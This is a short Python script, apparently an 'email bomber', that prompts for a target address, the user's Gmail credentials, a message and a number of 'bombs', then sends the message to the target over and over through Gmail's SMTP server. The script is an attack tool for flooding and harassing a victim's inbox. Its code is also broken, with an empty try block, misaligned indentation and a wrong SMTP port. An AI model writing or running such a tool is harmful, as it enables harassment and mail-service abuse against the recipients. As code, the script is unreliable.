 
import smtplib
import time





try:
    bomb_email = input("Email: ")



    email = input("Enter your gmail_address:")
    password = input("Enter your gmail_password:")
    message = input("Enter your message:")
    counter = int(input("How many bombs?:"))
   



 
for x in range(0,counter):
        print("Number of Message Sent : ", x+1)

        mail = smtplib.SMTP('smtp.gmail.com',586)
        mail.ehlo()
        mail.starttls()
        mail.login(email,password)
        mail.sendmail(email,bomb_email,message)
        time.sleep(1)
    mail.close()
    
except Exception as e:
    print("Just try it again - or run sadly to your admin(s)...")
